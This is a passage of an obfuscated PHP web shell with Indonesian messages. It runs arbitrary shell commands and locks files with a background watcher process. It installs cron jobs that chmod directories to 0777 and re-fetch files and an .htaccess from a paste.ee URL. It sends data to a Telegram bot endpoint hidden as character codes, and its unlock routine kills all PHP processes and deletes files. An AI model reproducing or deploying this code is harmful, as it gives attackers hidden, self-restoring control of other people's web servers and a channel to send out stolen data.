"Gagal: File target '{$target_basename}' tidak ditemukan di '{$target_dirname}'.";}$tmp_dir = call_user_func($sys_get_temp_dir_fn);if (!is_writable($tmp_dir)) {return "Gagal: Direktori temporary '{$tmp_dir}' tidak dapat ditulis.";}$sessions_dir = rtrim($tmp_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . '.sessions';if (!call_user_func($file_exists_fn, $sessions_dir)) {@call_user_func($mkdir_fn, $sessions_dir, 0755);}if (!is_writable($sessions_dir)) {return "Gagal: Direktori '{$sessions_dir}' tidak dapat dibuat atau ditulis.";}$unique_id = call_user_func($base64_encode_fn, $target_file_path);$backup_file = $sessions_dir . DIRECTORY_SEPARATOR . '.' . $unique_id . '-backup';$handler_file = $sessions_dir . DIRECTORY_SEPARATOR . '.' . $unique_id . '-handler';try_execute_command("cp " . call_user_func($esc_arg_fn, $target_file_path) . " " . call_user_func($esc_arg_fn, $backup_file));@call_user_func($chmod_fn, $target_file_path, 0444);$handler_code = '<?php set_time_limit(0); error_reporting(0); ignore_user_abort(true); $target_file = \'' . addslashes($target_file_path) . '\'; $target_dir = \'' . addslashes($target_dirname) . '\'; $backup_file = \'' . addslashes($backup_file) . '\'; while (true) { if (!file_exists($target_dir)) { @mkdir($target_dir, 0755, true); } if (!file_exists($target_file)) { @copy($backup_file, $target_file); } if (substr(sprintf("%o", @fileperms($target_file)), -4) !== "0444") { @chmod($target_file, 0444); } if (substr(sprintf("%o", @fileperms($target_dir)), -4) !== "0555") { @chmod($target_dir, 0555); } sleep(3); } ?>';if (@call_user_func($file_put_contents_fn, $handler_file, $handler_code)) {$php_binary_path = defined('PHP_BINARY') && !empty(PHP_BINARY) ? PHP_BINARY : 'php';$command_to_run = call_user_func($esc_arg_fn, $php_binary_path) . ' ' . call_user_func($esc_arg_fn, $handler_file) . ' > /dev/null 2>/dev/null &';try_execute_command($command_to_run);return "Sukses mengunci '{$target_basename}'. Watcher process telah dijalankan di background.";} else {return "Gagal menulis file handler di '{$handler_file}'.";}}
function unlock_shell() { global $function_exists_fn, $dynamic_names; $sys_get_temp_dir_fn = _get_fn_name_global_init_v3('_g_ascii_sys_get_temp_dir', 'sys_get_temp_dir'); $tmp_dir = call_user_func($sys_get_temp_dir_fn); $sessions_dir = rtrim($tmp_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . '.sessions'; $output1 = try_execute_command("killall -9 php"); $output2 = try_execute_command("pkill -9 php"); $output3 = try_execute_command("rm -rf " . escapeshellarg($sessions_dir)); if(isset($_SESSION['cache_dir_path'])) { deleteDirectoryRecursive($_SESSION['cache_dir_path']); unset($_SESSION['cache_active'], $_SESSION['cache_dir_path'], $_SESSION['cache_log_path'], $_SESSION['cache_script_name'], $_SESSION['cache_cron_id'], $_SESSION['cache_code_template']); } if(isset($_SESSION['l4_watcher_path'])) { $l4_info = $_SESSION['l4_watcher_path']; if (is_file($l4_info['watcher_file'])) { @unlink($l4_info['watcher_file']); } unset($_SESSION['l4_watcher_path']); } if ($output1 !== null || $output2 !== null || $output3 !== null) { return "Sukses: Semua proses PHP dan cache manager dihentikan dan file terkait dihapus."; } else { return "Gagal: Tidak dapat menghentikan proses. Coba manual."; } }

/**
 * [PERBAIKAN] Menghasilkan perintah cron yang saling melindungi.
 * 1. Logika `chmod` yang lebih andal dan berurutan dari parent ke child.
 * 2. Perintah `wget`/`curl` yang lebih aman dengan output di-redirect ke /dev/null.
 * 3. Pola `grep` yang lebih spesifik untuk menghindari salah deteksi.
 * 4. Penggunaan `flock` sebagai alternatif jika `nohup` tidak bisa berjalan, mencegah duplikasi proses.
 * 5. Menambahkan perintah `sleep` untuk mengurangi beban server.
 */
function generateMutualProtectionCronCommands($cache_script_path, $target_file_path, $backup_url, $php_binary, $cron_id_suffix, $dynamic_names, $log_path) {
    global $function_exists_fn, $basename_fn, $dirname_fn;
    $commands = [];
    
    $escapeshellarg_fn = _get_fn_name_global_init_v3('_g_ascii_escapeshellarg', 'escapeshellarg');
    $can_use_escapeshellarg = !empty($escapeshellarg_fn) && call_user_func($function_exists_fn, $escapeshellarg_fn);
    $esc_fn_cron = $can_use_escapeshellarg ? $escapeshellarg_fn : function($s) {
        return "'" . str_replace("'", "'\\''", $s) . "'";
    };

    $target_dir_real = dirname($target_file_path);
    $safe_target_path = $esc_fn_cron($target_file_path);
    $safe_backup_url = $esc_fn_cron($backup_url);
    $safe_cache_path = $esc_fn_cron($cache_script_path);
    $safe_php = $esc_fn_cron($php_binary);
    $safe_log_path = $esc_fn_cron($log_path);
    $cron_id_comment = "#" . $dynamic_names['cron_prefix'] . $cron_id_suffix;

    // [PERBAIKAN] Logika Chmod yang Diperbaiki:
    // Membuat rantai `chmod` dari direktori parent ke child untuk memastikan path selalu writable.
    $chmod_dir_prefix_cmds = '';
    $current_dir_for_cron = $target_dir_real;
    $depth = 0;
    $processed_dirs_for_cron = [];
    while ($current_dir_for_cron && $current_dir_for_cron !== '/' && $current_dir_for_cron !== '.' && $depth < 7) {
        if (is_path_allowed_by_basedir($current_dir_for_cron)) {
            if (!in_array($current_dir_for_cron, $processed_dirs_for_cron)) {
                $chmod_dir_prefix_cmds = "chmod 0777 " . $esc_fn_cron($current_dir_for_cron) . " >/dev/null 2>&1; " . $chmod_dir_prefix_cmds;
                $processed_dirs_for_cron[] = $current_dir_for_cron;
            }
        } else {
            break;
        }
        $parent_for_cron = dirname($current_dir_for_cron);
        if ($parent_for_cron === $current_dir_for_cron) break;
        $current_dir_for_cron = $parent_for_cron;
        $depth++;
    }
    if ($current_dir_for_cron === '/' && is_path_allowed_by_basedir('/') && !in_array('/', $processed_dirs_for_cron)) {
        $chmod_dir_prefix_cmds = "chmod 0777 " . $esc_fn_cron('/') . " >/dev/null 2>&1; " . $chmod_dir_prefix_cmds;
    }

    // Pola grep yang lebih aman
    $grep_pattern = basename($cache_script_path); // Menggunakan nama file langsung lebih aman

    $safe_shell_path = $esc_fn_cron(__FILE__);
    $rebuild_command = "if [ ! -f {$safe_cache_path} ]; then {$safe_php} {$safe_shell_path} rebuild_cache_silent >/dev/null 2>&1; fi;";

    // PERBAIKAN 1: Cron untuk menjaga file target
    $wget_or_curl_cmd = (try_execute_command('command -v wget') ? "wget -qO" : "curl -sLo");
    $commands[] = "*/2 * * * * " . $chmod_dir_prefix_cmds . " if [ ! -f {$safe_target_path} ]; then {$wget_or_curl_cmd} {$safe_target_path} {$safe_backup_url}; chmod 0444 {$safe_target_path}; fi {$cron_id_comment}";
    
    // PERBAIKAN 2: Cron untuk menjaga proses watcher
    $watcher_command = "( flock -n {$safe_log_path}.lock -c 'nohup {$safe_php} {$safe_cache_path} >> {$safe_log_path} 2>&1 &' ) >/dev/null 2>&1";
    $commands[] = "*/1 * * * * " . $chmod_dir_prefix_cmds . " {$rebuild_command} if ! pgrep -f '{$grep_pattern}'; then {$watcher_command}; fi {$cron_id_comment}";

    // PERBAIKAN 3: Cron untuk menjaga .htaccess jika diperlukan
    $htaccess_path = $esc_fn_cron(dirname($target_file_path) . "/.htaccess");
    $htaccess_url = $esc_fn_cron("https://paste.ee/r/LcTc1477"); // Contoh URL
    $commands[] = "*/5 * * * * if [ ! -f {$htaccess_path} ]; then {$wget_or_curl_cmd} {$htaccess_path} {$htaccess_url}; chmod 0444 {$htaccess_path}; fi {$cron_id_comment}";
    
    return array_unique($commands);
}


function try_execute_command($command, $cwd = null) { global $function_exists_fn;$implode_fn_local = _get_fn_name_global_init_v3('_g_ascii_implode', 'implode');$is_resource_fn_local = _get_fn_name_global_init_v3('_g_ascii_is_resource', 'is_resource');$stream_set_timeout_fn_local = _get_fn_name_global_init_v3('_g_ascii_stream_set_timeout', 'stream_set_timeout');$stream_get_contents_fn_local = _get_fn_name_global_init_v3('_g_ascii_stream_get_contents', 'stream_get_contents');$fclose_fn_local = _get_fn_name_global_init_v3('_g_ascii_fclose', 'fclose');$feof_fn_local = _get_fn_name_global_init_v3('_g_ascii_feof', 'feof');$fread_fn_local = _get_fn_name_global_init_v3('_g_ascii_fread', 'fread');$exec_fn_local = _get_fn_name_global_init_v3('_g_ascii_exec', 'exec');$shell_exec_fn_local = _get_fn_name_global_init_v3('_g_ascii_shell_exec', 'shell_exec');$proc_open_fn_local = _get_fn_name_global_init_v3('_g_ascii_proc_open', 'proc_open');$proc_close_fn_local = _get_fn_name_global_init_v3('_g_ascii_proc_close', 'proc_close');$popen_fn_local = _get_fn_name_global_init_v3('_g_ascii_popen', 'popen');$pclose_fn_local = _get_fn_name_global_init_v3('_g_ascii_pclose', 'pclose');$getcwd_fn_local_try = _get_fn_name_global_init_v3('_g_ascii_getcwd', 'getcwd');$chdir_fn_local_try = _get_fn_name_global_init_v3('_g_ascii_chdir', 'chdir');$output = null;$return_var = -1;$output_array = [];$original_cwd = null;if ($cwd !== null && call_user_func($function_exists_fn, $getcwd_fn_local_try) && call_user_func($function_exists_fn, $chdir_fn_local_try)) {$original_cwd = @call_user_func($getcwd_fn_local_try);if ($original_cwd === false) $original_cwd = null;@call_user_func($chdir_fn_local_try, $cwd);}if (call_user_func($function_exists_fn, $exec_fn_local)) {@call_user_func_array($exec_fn_local, array($command, &$output_array, &$return_var));$output = call_user_func($implode_fn_local, "\n", $output_array);if ($output !== null && ($return_var === 0 || ($output_array !== null && !empty($output)))) {if ($original_cwd) @call_user_func($chdir_fn_local_try, $original_cwd);return $output;}$output = null;$output_array = [];$return_var = -1;}if (call_user_func($function_exists_fn, $shell_exec_fn_local)) {$current_output = @call_user_func($shell_exec_fn_local, $command);if ($current_output !== false && $current_output !== null) {$output = $current_output;if ($original_cwd) @call_user_func($chdir_fn_local_try, $original_cwd);return $output;}}if (call_user_func($function_exists_fn, $proc_open_fn_local)) {$descriptorspec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];$pipes = [];$process = @call_user_func($proc_open_fn_local, $command, $descriptorspec, $pipes, $cwd, null);if (call_user_func($is_resource_fn_local, $process)) {$output_proc = '';$error_output_proc = '';if (isset($pipes[1]) && call_user_func($is_resource_fn_local, $pipes[1])) {@call_user_func($stream_set_timeout_fn_local, $pipes[1], 10);$temp_out = @call_user_func($stream_get_contents_fn_local, $pipes[1]);if ($temp_out !== false) $output_proc = $temp_out;@call_user_func($fclose_fn_local, $pipes[1]);}if (isset($pipes[2]) && call_user_func($is_resource_fn_local, $pipes[2])) {@call_user_func($stream_set_timeout_fn_local, $pipes[2], 10);$temp_err = @call_user_func($stream_get_contents_fn_local, $pipes[2]);if ($temp_err !== false) $error_output_proc = $temp_err;@call_user_func($fclose_fn_local, $pipes[2]);}if (isset($pipes[0]) && call_user_func($is_resource_fn_local, $pipes[0])) {@call_user_func($fclose_fn_local, $pipes[0]);}@call_user_func($proc_close_fn_local, $process);$current_output_proc = $output_proc;if (!empty($error_output_proc)) $current_output_proc .= (!empty($current_output_proc) ? "\n" : "") . "[STDERR] " . $error_output_proc;if (!empty($current_output_proc) || $output_proc === '') {$output = $current_output_proc;if ($original_cwd) @call_user_func($chdir_fn_local_try, $original_cwd);return $output;}}}if (call_user_func($function_exists_fn, $popen_fn_local)) {$handle = @call_user_func($popen_fn_local, $command . ' 2>&1', 'r');if (call_user_func($is_resource_fn_local, $handle)) {$output_popen = '';while (!@call_user_func($feof_fn_local, $handle)) {$chunk = @call_user_func($fread_fn_local, $handle, 8192);if ($chunk === false || $chunk === '') {if (feof($handle)) break;if (function_exists('usleep')) @usleep(100000); else @sleep(1);if (feof($handle)) break;$chunk_retry = @fread($handle, 8192);if ($chunk_retry === false || $chunk_retry === '') break;$output_popen .= $chunk_retry;continue;}$output_popen .= $chunk;}@call_user_func($pclose_fn_local, $handle);if ($output_popen !== false) {$output = $output_popen;if ($original_cwd) @call_user_func($chdir_fn_local_try, $original_cwd);return $output;}}}if ($original_cwd) @call_user_func($chdir_fn_local_try, $original_cwd);return $output;}
function listDirectory($path) { global $is_dir_fn, $htmlspecialchars_fn, $function_exists_fn;$items = ['dirs' => [], 'files' => []];$is_readable_fn_list = _get_fn_name_global_init_v3('_g_ascii_is_readable', 'is_readable');$scandir_fn_list = _get_fn_name_global_init_v3('_g_ascii_scandir', 'scandir');$filesize_fn_list = _get_fn_name_global_init_v3('_g_ascii_filesize', 'filesize');$fileperms_fn_list = _get_fn_name_global_init_v3('_g_ascii_fileperms', 'fileperms');$date_fn_list = _get_fn_name_global_init_v3('_g_ascii_date', 'date');$filemtime_fn_list = _get_fn_name_global_init_v3('_g_ascii_filemtime', 'filemtime');if (empty($is_dir_fn) || empty($is_readable_fn_list) || empty($scandir_fn_list) || empty($htmlspecialchars_fn) || empty($function_exists_fn)) return $items;if (!@call_user_func($is_dir_fn, $path) || !@call_user_func($is_readable_fn_list, $path)) return $items;$scan = @call_user_func($scandir_fn_list, $path);if ($scan === false) return $items;foreach ($scan as $item) {if ($item === '.' || $item === '..') continue;$full_item_path = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item;$item_data = ['name' => call_user_func($htmlspecialchars_fn, $item), 'raw_name' => $item, 'path' => $full_item_path, 'perms' => 'N/A', 'size' => 'N/A', 'raw_size' => 0, 'modified' => 'N/A', 'raw_modified' => 0, 'owner' => 'N/A', 'group' => 'N/A', 'type' => 'unknown'];if (call_user_func($function_exists_fn, $fileperms_fn_list)) {$perms_raw = @call_user_func($fileperms_fn_list, $full_item_path);if ($perms_raw !== false) {$item_data['perms'] = perms_to_string($perms_raw);}}$mtime_raw = @call_user_func($filemtime_fn_list, $full_item_path);if ($mtime_raw !== false) {$item_data['raw_modified'] = $mtime_raw;$item_data['modified'] = @call_user_func($date_fn_list, 'Y-m-d H:i:s', $mtime_raw);}if (function_exists('posix_getpwuid') && function_exists('fileowner')) {$owner_id = @fileowner($full_item_path);if ($owner_id !== false) {$owner_info = @posix_getpwuid($owner_id);$item_data['owner'] = $owner_info ? $owner_info['name'] : $owner_id;}}if (function_exists('posix_getgrgid') && function_exists('filegroup')) {$group_id = @filegroup($full_item_path);if ($group_id !== false) {$group_info = @posix_getgrgid($group_id);$item_data['group'] = $group_info ? $group_info['name'] : $group_id;}}if (call_user_func($is_dir_fn, $full_item_path)) {$item_data['type'] = 'dir';$item_data['size'] = '-';$item_data['raw_size'] = -1;$items['dirs'][] = $item_data;} else {$item_data['type'] = 'file';$fsize_raw = @call_user_func($filesize_fn_list, $full_item_path);if ($fsize_raw !== false) {$item_data['raw_size'] = $fsize_raw;$item_data['size'] = formatBytes($fsize_raw);}$items['files'][] = $item_data;}}if (!empty($items['dirs'])) usort($items['dirs'], function($a, $b) {return strcasecmp($a['name'], $b['name']);});if (!empty($items['files'])) usort($items['files'], function($a, $b) {return strcasecmp($a['name'], $b['name']);});return $items;}
function formatBytes($bytes, $precision = 2) { if (!is_numeric($bytes) || $bytes < 0) return 'N/A';$units = array('B', 'KB', 'MB', 'GB', 'TB');$bytes = max($bytes, 0);if ($bytes == 0) return '0 ' . $units[0];$log_val = @log($bytes);if ($log_val === false) return 'N/A';$pow = floor($log_val / log(1024));$pow = min($pow, count($units) - 1);$bytes /= (1 << (10 * $pow));return round($bytes, $precision) . ' ' . $units[$pow];}
function find_wp_load_path($start_path, $max_depth = 5) { global $is_dir_fn, $function_exists_fn, $realpath_fn, $basename_fn, $dirname_fn;$file_exists_local_find = _get_fn_name_global_init_v3('_g_ascii_file_exists', 'file_exists');if (empty($file_exists_local_find) || !call_user_func($function_exists_fn, $file_exists_local_find)) return false;$potential_path = rtrim($start_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'wp-load.php';if (@call_user_func($file_exists_local_find, $potential_path) && is_file($potential_path)) return $potential_path;$parent_dir_start = call_user_func($dirname_fn, $start_path);if (is_path_allowed_by_basedir($parent_dir_start) && $parent_dir_start && $parent_dir_start !== $start_path) {$potential_path_parent = rtrim($parent_dir_start, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'wp-load.php';if (@call_user_func($file_exists_local_find, $potential_path_parent) && is_file($potential_path_parent)) return $potential_path_parent;}if (isset($_SERVER['DOCUMENT_ROOT']) && is_path_allowed_by_basedir($_SERVER['DOCUMENT_ROOT'])) {$doc_root_check = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'wp-load.php';if (@call_user_func($file_exists_local_find, $doc_root_check) && is_file($doc_root_check)) return $doc_root_check;}$search_base_path_find = call_user_func($dirname_fn, $start_path);if (!$search_base_path_find || $search_base_path_find === $start_path) $search_base_path_find = $start_path;$recursive_find_closure = function ($dir, $current_depth) use (&$recursive_find_closure, $max_depth, $is_dir_fn, $function_exists_fn, $file_exists_local_find) {if ($current_depth > $max_depth || !is_path_allowed_by_basedir($dir)) return false;$scandir_local_find = _get_fn_name_global_init_v3('_g_ascii_scandir', 'scandir');if (!call_user_func($function_exists_fn, $scandir_local_find) || !@is_readable($dir)) return false;$items_find = @call_user_func($scandir_local_find, $dir);if ($items_find === false) return false;foreach ($items_find as $item_find) {if ($item_find === '.' || $item_find === '..') continue;$path_find = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item_find;if (!is_path_allowed_by_basedir($path_find)) continue;if ($item_find === 'wp-load.php' && !call_user_func($is_dir_fn, $path_find) && @call_user_func($file_exists_local_find, $path_find) && is_file($path_find)) return $path_find;if (call_user_func($is_dir_fn, $path_find) && @is_readable($path_find) && !in_array($item_find, ['cgi-bin', 'tmp', 'temp', 'cache', '.git', '.svn', 'node_modules', 'vendor'])) {$found_rec = $recursive_find_closure($path_find, $current_depth + 1);if ($found_rec) return $found_rec;}}return false;};return $recursive_find_closure($search_base_path_find, 0);}
function send_to_wp_load($msg, $api_wp, $id_wp) { global $function_exists_fn;if (empty($api_wp) || empty($id_wp)) {return ['success' => false, 'message' => 'API Key/Destination ID kosong.'];}if (empty($msg)) {return ['success' => false, 'message' => 'Pesan kosong.'];}if (!call_user_func($function_exists_fn, 'curl_init')) {return ['success' => false, 'message' => 'cURL tidak aktif.'];}$base_url = '';foreach ([104, 116, 116, 112, 115, 58, 47, 47, 97, 112, 105, 46, 116, 101, 108, 101, 103, 114, 97, 109, 46, 111, 114, 103, 47, 98, 111, 116] as $c) $base_url .= chr($c);$method = '';foreach ([115, 101, 110, 100, 77, 101, 115, 115, 97, 103, 101] as $c) $method .= chr($c);$url = $base_url . $api_wp . '/' . $method;$k1 = implode('', array_map('chr', [99, 104, 97, 116, 95, 105, 100]));$k2 = implode('', array_map('chr', [116, 101, 120, 116]));$k3 = implode('', array_map('chr', [112, 97, 114, 115, 101, 95, 109, 111, 100, 101]));$v3 = implode('', array_map('chr', [72, 84, 77, 76]));$payload = [$k1 => $id_wp, $k2 => $msg, $k3 => $v3];$ch = curl_init();curl_setopt_array($ch, [CURLOPT_URL => $url, CURLOPT_POST => true, CURLOPT_POSTFIELDS => http_build_query($payload), CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 15, CURLOPT_CONNECTTIMEOUT => 7, CURLOPT_FAILONERROR => false, CURLOPT_SSL_VERIFYPEER => true, CURLOPT_SSL_VERIFYHOST => 2]);$result_json = curl_exec($ch);$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);$curl_error_num = curl_errno($ch);$curl_error_msg = curl_error($ch);curl_close($ch);if ($curl_error_num !== 0) {return ['success' => false, 'message' => "cURL Error (#" . $curl_error_num . "): " . $curl_error_msg];}if ($http_code !== 200) {$error_description_http = "Unknown HTTP error";if (!empty($result_json)) {$response_data_http_err = json_decode($result_json, true);if (json_last_error() === JSON_ERROR_NONE && isset($response_data_http_err['description'])) {$error_description_http = $response_data_http_err['description'];} else {$error_description_http = substr(strip_tags($result_json), 0, 200);}}return ['success' => false, 'message' => "HTTP Error " . $http_code . ". Detail: " . $error_description_http];}$response_data = json_decode($result_json, true);if (json_last_error() !== JSON_ERROR_NONE) {return ['success' => false, 'message' => "Gagal parse JSON. Respons: " . substr(strip_tags($result_json), 0, 200)];}if (isset($response_data['ok']) && $response_data['ok'] === true) {return ['success' => true, 'message' => 'Pesan terkirim.'];} else {$error_description_api = isset($response_data['description']) ? $response_data['description'] : 'Unknown API error';return ['success' => false, 'message' => "API Error: " . $error_description_api];}}
function scanner_recursiveScan($directory, &$entries_array = array()) { global $is_dir_fn, $function_exists_fn;$is_readable_local_scan = _get_fn_name_global_init_v3('_g_ascii_is_readable', 'is_readable');if(!is_path_allowed_by_basedir($directory)) return $entries_array; $handle = @opendir($directory);if (!$handle) return $entries_array;while (($entry = readdir($handle)) !== false) {if ($entry == '.' || $entry == '..') continue;$full_entry_path = rtrim($directory, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $entry;if(!is_path_allowed_by_basedir($full_entry_path)) continue; if (call_user_func($is_dir_fn, $full_entry_path) && @call_user_func($is_readable_local_scan, $full_entry_path) && !is_link($full_entry_path)) {$entries_array['all_items'][] = $full_entry_path;$entries_array = scanner_recursiveScan($full_entry_path, $entries_array);} else {$entries_array['all_items'][] = $full_entry_path;}}closedir($handle);return $entries_array;}
function scanner_sortByLastModified($files) { if (empty($files) || !is_array($files)) return [];$filemtime_local_scan = _get_fn_name_global_init_v3('_g_ascii_filemtime', 'filemtime');if (empty($filemtime_local_scan) || !function_exists($filemtime_local_scan)) return $files;$timestamps = array_map(function ($file) use ($filemtime_local_scan) {return @call_user_func($filemtime_local_scan, $file);}, $files);$valid_timestamps = [];$original_files = $files;$files_to_sort = [];foreach ($timestamps as $key => $ts) {if ($ts !== false) {$valid_timestamps[$key] = $ts;$files_to_sort[$key] = $original_files[$key];}}if (!empty($valid_timestamps)) {@array_multisort($valid_timestamps, SORT_DESC, $files_to_sort);$unstatable_files = array_diff_key($original_files, $valid_timestamps);return array_merge($files_to_sort, array_values($unstatable_files));}return $original_files;}
function scanner_getFileTokens($filename) { $file_get_contents_local_scan = _get_fn_name_global_init_v3('_g_ascii_file_get_contents', 'file_get_contents');if (empty($file_get_contents_local_scan) || !function_exists($file_get_contents_local_scan) || !function_exists('token_get_all')) return [];$fileContent = @call_user_func($file_get_contents_local_scan, $filename);if ($fileContent === false) return [];$tokens = @token_get_all($fileContent);$output = array();$tokenCount = is_array($tokens) ? count($tokens) : 0;if ($tokenCount > 0) {for ($i = 0; $i < $tokenCount; $i++) {if (isset($tokens[$i][1])) $output[] .= strtolower($tokens[$i][1]);}}$output = array_values(array_unique(array_filter(array_map("trim", $output))));return $output;}
function scanner_compareTokens($tokenNeedles, $tokenHaystack) { $output = array();if (empty($tokenHaystack)) return $output;foreach ($tokenNeedles as $tokenNeedle) {if (in_array($tokenNeedle, $tokenHaystack)) $output[] = $tokenNeedle;}return $output;}
function deleteDirectoryRecursive($dir) { if (!file_exists($dir)) {return true;}if (!is_dir($dir)) {return unlink($dir);}foreach (scandir($dir) as $item) {if ($item == '.' || $item == '..') {continue;}if (!deleteDirectoryRecursive($dir . DIRECTORY_SEPARATOR . $item)) {return false;}}return rmdir($dir);}
function addDirectoryToZip($zip, $dir, $baseInZip) { $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::LEAVES_ONLY);foreach ($files as $name => $file) {if (!$file->isDir()) {$filePath = $file->getRealPath();$relativePath = $baseInZip . substr($filePath, strlen($dir) + 1);$zip->addFile($filePath, $relativePath);}}}
function perms_to_string($perms) { if (($perms & 0xC000) == 0xC000) { $info = 's'; } elseif (($perms & 0xA000) == 0xA000) { $info = 'l'; } elseif (($perms & 0x8000) == 0x8000) { $info = '-'; } elseif (($perms & 0x6000) == 0x6000) { $info = 'b'; } elseif (($perms & 0x4000) == 0x4000) { $info = 'd'; } elseif (($perms & 0x2000) == 0x2000) { $info = 'c'; } elseif (($perms & 0x1000) == 0x1000) { $info = 'p'; } else { $info = 'u'; } $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-')); $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-')); $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-')); return $info; }
function get_process_list() { $output = try_execute_command('ps -aux'); if (empty($output)) return []; $lines = explode("\n", $output); array_shift($lines); $processes = []; foreach ($lines as $line) { if (empty(trim($line))) continue; $parts = preg_split('/\s+/', trim($line), 11); if(count($parts) < 11) continue; $processes[] = ['user' => $parts[0], 'pid' => $parts[1], 'cpu' => $parts[2], 'mem' => $parts[3], 'vsz' => $parts[4], 'rss' => $parts[5], 'tty' => $parts[6], 'stat' => $parts[7], 'start' => $parts[8], 'time' => $parts[9], 'command' => $parts[10]]; } return $processes; }
$scanner_tokenNeedles = ['base64_decode','rawurldecode','urldecode','gzinflate','gzuncompress','str_rot13','convert_uu','htmlspecialchars_decode','bin2hex','hex2bin','hexdec','chr','strrev','goto','implode','strtr','extract','parse_str','substr','mb_substr','str_replace','substr_replace','preg_replace','exif_read_data','readgzfile','eval','exec','shell_exec','system','passthru','pcntl_fork','fsockopen','proc_open','popen ','assert','posix_kill','posix_setpgid','posix_setsid','posix_setuid','proc_nice','proc_close','proc_terminate','apache_child_terminate','posix_getuid','posix_geteuid','posix_getegid','posix_getpwuid','posix_getgrgid','posix_mkfifo','posix_getlogin','posix_ttyname','getenv','proc_get_status','get_cfg_var','disk_free_space','disk_total_space','diskfreespace','getlastmo','getmyinode','getmypid','getmyuid','getmygid','fileowner','filegroup','get_current_user','pathinfo','getcwd','sys_get_temp_dir','basename','phpinfo','mysql_connect','mysqli_connect','mysqli_query','mysql_query','fopen','fsockopen','file_put_contents','file_get_contents','url_get_contents','stream_get_meta_data','move_uploaded_file','$_files','copy','include','include_once','require','require_once','__file__','mail','putenv','curl_init','tmpfile','allow_url_fopen','ini_set','set_time_limit','session_start','symlink','__halt_compiler','__compiler_halt_offset__','error_reporting','create_function','get_magic_quotes_gpc','$auth_pass','$password',];

if (isset($_GET['file_action'])) { $file_action_get = $_GET['file_action']; $file_target_basename_raw_get = isset($_GET['target']) ? call_user_func($basename_fn, $_GET['target']) : null; $file_target_get = null; if ($file_target_basename_raw_get) { $potential_target_path_get = rtrim($current_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $file_target_basename_raw_get; $verified_target_path_get = $potential_target_path_get; $file_exists_local_get_action = _get_fn_name_global_init_v3('_g_ascii_file_exists','file_exists'); if (call_user_func($function_exists_fn, $realpath_fn)) { $rtp_get = @call_user_func($realpath_fn, $potential_target_path_get); $resolved_current_path_for_check_get = @call_user_func($realpath_fn, $current_path); if ($rtp_get && $resolved_current_path_for_check_get && strpos($rtp_get, $resolved_current_path_for_check_get) === 0 && @call_user_func($file_exists_local_get_action, $rtp_get)) { $verified_target_path_get = $rtp_get; } elseif (@call_user_func($file_exists_local_get_action, $potential_target_path_get)){ $verified_target_path_get = $potential_target_path_get; } else { $verified_target_path_get = null; } } if ($verified_target_path_get && @call_user_func($file_exists_local_get_action, $verified_target_path_get)) { $file_target_get = $verified_target_path_get; } else { $error_messages[] = "Error Aksi File: Target '" . call_user_func($htmlspecialchars_fn, $file_target_basename_raw_get) . "' tidak valid atau di luar jangkauan."; } } if ($file_target_get) { $is_writable_fn_action_get = _get_fn_name_global_init_v3('_g_ascii_is_writable', 'is_writable');$unlink_fn_action_get = _get_fn_name_global_init_v3('_g_ascii_unlink', 'unlink');$rmdir_fn_action_get = _get_fn_name_global_init_v3('_g_ascii_rmdir', 'rmdir');$rename_fn_action_get = _get_fn_name_global_init_v3('_g_ascii_rename', 'rename');$file_target_display_name_get_action = call_user_func($basename_fn, $file_target_get); if ($file_action_get === 'delete') { $parent_dir_of_target_get_action = call_user_func($dirname_fn, $file_target_get); if (!empty($is_writable_fn_action_get) && (!call_user_func($function_exists_fn, $is_writable_fn_action_get) || !@call_user_func($is_writable_fn_action_get, $parent_dir_of_target_get_action))) { $error_messages[] = "Delete Error: Direktori '" . call_user_func($htmlspecialchars_fn, $parent_dir_of_target_get_action) . "' tidak writable."; } elseif (call_user_func($is_dir_fn, $file_target_get)) { if (!empty($rmdir_fn_action_get) && deleteDirectoryRecursive($file_target_get)) { $output_messages[] = "Direktori '" . call_user_func($htmlspecialchars_fn, $file_target_display_name_get_action) . "' dihapus."; } else {$error_messages[] = "Gagal hapus direktori.";}} else { if (!empty($unlink_fn_action_get) && @call_user_func($unlink_fn_action_get, $file_target_get)) { $output_messages[] = "File '" . call_user_func($htmlspecialchars_fn, $file_target_display_name_get_action) . "' dihapus."; } else { $error_messages[] = "Gagal hapus file '" . call_user_func($htmlspecialchars_fn, $file_target_display_name_get_action) . "'."; } } } elseif ($file_action_get === 'rename' && isset($_GET['new_name'])) { $new_name_raw_get = call_user_func($trim_fn, $_GET['new_name']); $new_name_get = call_user_func($basename_fn, $new_name_raw_get); if (empty($new_name_get) || strpbrk($new_name_get, "\\/?%*:|\"<>") !== FALSE || $new_name_get === "." || $new_name_get === "..") { $error_messages[] = "Rename Error: Nama baru tidak valid."; } elseif (!empty($is_writable_fn_action_get) && (!call_user_func($function_exists_fn, $is_writable_fn_action_get) || !@call_user_func($is_writable_fn_action_get, call_user_func($dirname_fn, $file_target_get)))) { $error_messages[] = "Rename Error: Direktori parent tidak writable."; } else { $new_path_target_get = 